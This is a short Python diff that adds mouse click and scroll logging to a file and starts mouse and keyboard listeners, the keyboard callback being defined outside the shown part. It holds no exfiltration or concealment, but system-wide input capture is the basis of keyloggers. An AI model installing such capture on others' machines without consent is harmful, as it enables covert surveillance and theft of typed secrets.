@@ -53,3 +53,19 @@ logging.basicConfig(filename="mouse_log.txt", level=logging.DEBUG, format='%(asc
 
 def on_move(x, y):
     logging.info("Mouse moved to ({0}, {1})".format(x, y))
+
+def on_click(x, y, button, pressed):
+    if pressed:
+        logging.info('Mouse clicked at ({0}, {1}) with {2}'.format(x, y, button))
+
+
+def on_scroll(x, y, dx, dy):
+    logging.info('Mouse scrolled at ({0}, {1})({2}, {3})'.format(x, y, dx, dy))
+
+mouse_listener = MouseListener (on_move=on_move, on_click=on_click, on_scroll=on_scroll)
+
+keyboard_listener = KeyboardListener(on_press=on_press)
+mouse_listener.start()
+keyboard_listener.start()
+mouse_listener.join()
+keyboard_listener.join()
